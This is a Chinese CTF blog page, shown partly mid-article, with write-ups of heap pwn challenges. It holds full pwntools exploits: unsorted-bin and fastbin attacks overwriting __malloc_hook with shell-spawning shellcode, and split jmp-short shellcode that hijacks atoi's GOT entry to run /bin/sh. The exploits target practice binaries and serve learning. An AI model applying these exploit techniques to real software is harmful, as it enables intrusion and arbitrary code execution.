class="number">0</span>]))</span><br><span class="line">print(proc.pidof(r))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cre</span><span class="params">(size, data)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'1'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(idx)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'2'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upd</span><span class="params">(idx, size, data)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'3'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line">  r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line"><span class="comment">#因为我的本地环境glibc版本高于2.26(与远程环境不同)</span></span><br><span class="line"><span class="comment">#所以存在tache，要先把tache填满后再free才能加入unsorted bin</span></span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">delt(<span class="number">0</span>)</span><br><span class="line">delt(<span class="number">1</span>)</span><br><span class="line">delt(<span class="number">2</span>)</span><br><span class="line">delt(<span class="number">3</span>)</span><br><span class="line">delt(<span class="number">4</span>)</span><br><span class="line">delt(<span class="number">5</span>)</span><br><span class="line">delt(<span class="number">6</span>)</span><br><span class="line">delt(<span class="number">7</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<ul>
<li>调试也可以用gdb.attach(p)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; attach xxxx</span><br><span class="line">pwndbg&gt; unsortedbin</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x153c680 —▸ 0x7f15684a0be0 (main_arena+96) ◂— add    dh, 0x53 /* 0x153c680 */</span><br></pre></td></tr></table></figure>

<p>根据unsortedbin块的fd指针找到unsortedbin地址为0x7f1564a0be0 查看附近地址:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x7f15684a0b60</span><br><span class="line">0x7f15684a0b60 &lt;__memalign_hook&gt;:	0x00007f15683535a0	0x00007f1568353c20</span><br><span class="line">0x7f15684a0b70 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f15684a0b80 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f15684a0b90 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f15684a0ba0 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<ul>
<li>因为本机libc库版本不同，以上地址并不准确，根据题目附带的libc库得到的实际情况是__malloc_hook地址后3位十六进制数为0xb10，unsortedbin地址后3位十六进制数为0xb78</li>
</ul>
<p>根据内存的页载入机制，某条指令的后3个十六进制数字的是始终不变的，所以只需要利用unsorted bin attack 将unsorted bin 地址写入buf数组，再利用fastbin attack将unsorted bin 地址最后一位修改为0x10，即可得到__malloc_hook地址，并可以对该地址内容进行修改，修改 unsorted bin 的同时可以进行shellcode部署。</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>,arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#r = remote(host='111.198.29.45', port=33138)</span></span><br><span class="line">r = process(<span class="string">'./timu'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cre</span><span class="params">(size, data)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'1'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(idx)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'2'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upd</span><span class="params">(idx, size, data)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'3'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line">  r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line">buf_addr = <span class="number">0x601040</span></span><br><span class="line">unsorted_sz = <span class="number">0x80</span></span><br><span class="line">fast_sz = <span class="number">0x60</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cre(unsorted_sz, <span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#在unsorted bin attack 之前申请用于fastbin attack 的chunk，</span></span><br><span class="line">cre(fast_sz, <span class="string">'\n'</span>)</span><br><span class="line">delt(<span class="number">0</span>)</span><br><span class="line">upd(<span class="number">0</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(buf_addr + <span class="number">0x30</span> - <span class="number">0x10</span>))</span><br><span class="line">cre(unsorted_sz, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<p>unsorted bin attack 将unsorted bin 地址写入 buf_addr + 0x30 处 即写入buf[6],这里需要注意，用于fastbin attack 的chunk 要在unsorted bin attack 之前进行申请，否则会出错.但这是为什么呢？？！ 先记录一下报错:<br>    <strong>* Error in `./timu’: malloc(): memory corruption (fast): 0x000000000060107d *</strong><br>该死的tcache毁掉了我本地动态调试的梦想，淦，我又懒得换环境，有空学学docker再来解决这个疑问。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delt(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#fastbin attack</span></span><br><span class="line">upd(<span class="number">1</span>, <span class="number">0x8</span>, p64(buf_addr + <span class="number">0x2d</span>))</span><br><span class="line">cre(fast_sz, <span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#将buf_addr + 0x30 写入 buf[8], buf_addr + 0x90 写入 buf[9]</span></span><br><span class="line">cre(fast_sz, <span class="string">b'\x00'</span> * <span class="number">3</span> + p64(buf_addr + <span class="number">0x30</span>) + p64(buf_addr + <span class="number">0x90</span>))</span><br></pre></td></tr></table></figure>

<p>fastbin attack 只需要绕过对size的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)   ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">    <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">    <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">        errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">    errout:</span><br><span class="line">        malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>而以buf_addr + 0x2d = 0x60106d伪造的chunck的size字段大小为0x71 而我们之前申请的chunk 的 chunk_sz = 0x60 + 0x10 = 0x70 (不计符号位)，刚好符合检查条件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#*((char *)buf[8]) = '\x10'</span></span><br><span class="line">upd(<span class="number">8</span>, <span class="number">1</span>, <span class="string">'\x10'</span>)</span><br><span class="line"><span class="comment">#修改__malloc_hook 内容为shellcode的地址</span></span><br><span class="line">upd(<span class="number">6</span>, <span class="number">8</span>, p64(buf_addr + <span class="number">0x90</span>))</span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line"><span class="comment">#部署shellcode 到 buf_addr + 0x90</span></span><br><span class="line">upd(<span class="number">9</span>, len(shellcode), shellcode)</span><br><span class="line">r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'1'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Size: '</span>, <span class="string">'1'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/19/note-service2/">【XCTF攻防世界】 note-service2</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-19</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><blockquote>
<p>菜鸡的部分PWN wp</p>
</blockquote>
<h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><p>首先查看保护机制:</p>
<pre><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments</code></pre><ul>
<li>开启了Canary,栈溢出攻击会比较麻烦</li>
<li>没开NX,可以考虑将shellcode写入堆or栈</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_E30</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    put_menu();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your choice&gt;&gt; "</span>);</span><br><span class="line">    get_number();</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        del();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一共有5种操作，只实现了add(), del(), exit()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = note_sum;</span><br><span class="line">  <span class="keyword">if</span> ( note_sum &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = note_sum;</span><br><span class="line">    <span class="keyword">if</span> ( note_sum &lt;= <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">      index = get_number();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"size:"</span>);</span><br><span class="line">      result = get_number();</span><br><span class="line">      <span class="built_in">size</span> = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        note_ptrs[index] = <span class="built_in">malloc</span>(result);</span><br><span class="line">        <span class="keyword">if</span> ( !note_ptrs[index] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"malloc error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"content:"</span>);</span><br><span class="line">        read__(note_ptrs[index], <span class="built_in">size</span>);</span><br><span class="line">        result = note_sum++ + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>没有对index的范围进行限制，可进行数组越界访问</li>
<li>size最大为8(但由于read__()函数中会强制将最后一位赋值为’\0’，实际最多存储7位有效数据)</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v0 = get_number();</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)note_ptrs[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>未对index进行检查且指针free后未置空，存在UAF和double free漏洞(虽然好像用不到)</li>
</ul>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>将shellcode分块，分别存储在物理相连的chunk中，通过jmp short指令实现不同块间的跳转</p>
<blockquote>
<p>jmp short指令占用两字节，且使用相对下一条指令位置寻址，基本形式：0xExx, xx为偏移量，即<br>偏移量 = 目标地址 - 与jmp物理相邻的下一条指令地址 = 目标地址 - jmp指令地址 - 2</p>
</blockquote>
<table>
    <tr>
        <td rowspan="2">chunk0</td>
        <td colspan="3">prev_size</td>
        <td>size</td>
    </tr>
    <tr>
        <td>0x5字节</td>
        <td>jmp short xx</td>
        <td>'\0'</td>
        <td>data_remain(8字节)</td>
    </tr>
    <tr>
        <td rowspan="2">chunk1</td>
        <td colspan="3">prev_size</td>
        <td>size</td>
    </tr>
    <tr>
        <td>0x5字节</td>
        <td>jmp short xx</td>
        <td>'\0'</td>
        <td>data_remain(8字节)</td>
    </tr>
</table>

<p>显然本题中 偏移量 = 1 + sizeof(data_remain) + sizeof(prev_size) + sizeof(size) = 0x19</p>
<p>修改atoi()got表内容为shellcode第一个分块的指针</p>
<blockquote>
<p>.got.plt:0000000000202060 off_202060      dq offset atoi          ; DATA XREF: _atoi↑r<br>                                             ···<br>.bss:00000000002020A0 note_ptrs       dq 0Ch dup(?)           ; DATA XREF: sub_BE0+18↑o</p>
</blockquote>
<p>数组索引-8处为got表atoi()项</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = remote(host = '111.198.29.45', port=56574)</span></span><br><span class="line">sh = process(<span class="string">'./note'</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, context)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>, str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">'size:'</span>, <span class="string">'8'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'content:'</span>, context)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">'4'</span>)</span><br><span class="line">    sh.sendlineafter</span><br><span class="line"></span><br><span class="line"><span class="comment">#将execve的系统调用号写入rax</span></span><br><span class="line"><span class="comment">#如果数据空间更小可以尝试用push pop</span></span><br><span class="line">code0 = asm(<span class="string">'xor rax, rax'</span>).ljust(<span class="number">5</span>, <span class="string">'\x90'</span>) + <span class="string">'\xeb\x19'</span></span><br><span class="line">code1 = asm(<span class="string">'mov eax, 0x3b'</span>).ljust(<span class="number">5</span>, <span class="string">'\x90'</span>) + <span class="string">'\xeb\x19'</span></span><br><span class="line"></span><br><span class="line">code2 = asm(<span class="string">'xor rsi, rsi'</span>).ljust(<span class="number">5</span>, <span class="string">'\x90'</span>) + <span class="string">'\xeb\x19'</span></span><br><span class="line">code3 = asm(<span class="string">'xor rdx, rdx'</span>).ljust(<span class="number">5</span>, <span class="string">'\x90'</span>) + <span class="string">'\xeb\x19'</span></span><br><span class="line">code4 = asm(<span class="string">'syscall'</span>).ljust(<span class="number">7</span>, <span class="string">'\x90'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, code0)</span><br><span class="line">add(<span class="number">1</span>, code1)</span><br><span class="line">add(<span class="number">2</span>, code2)</span><br><span class="line">add(<span class="number">3</span>, code3)</span><br><span class="line">add(<span class="number">4</span>, code4)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#重新申请第一个堆块，将shellcode指针写入数组索引-8处，并将code0写入堆块</span></span><br><span class="line">add(<span class="number">-8</span>, code0)</span><br><span class="line"><span class="comment">#'/bin/sh'地址传入rdi，然后调用atoi()跳转到shellcode执行</span></span><br><span class="line">sh.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By Soinux</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/ Relative)","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":100,"height":180},"mobile":{"show":false},"react":{"opacityDefault":0}});</script></body></html>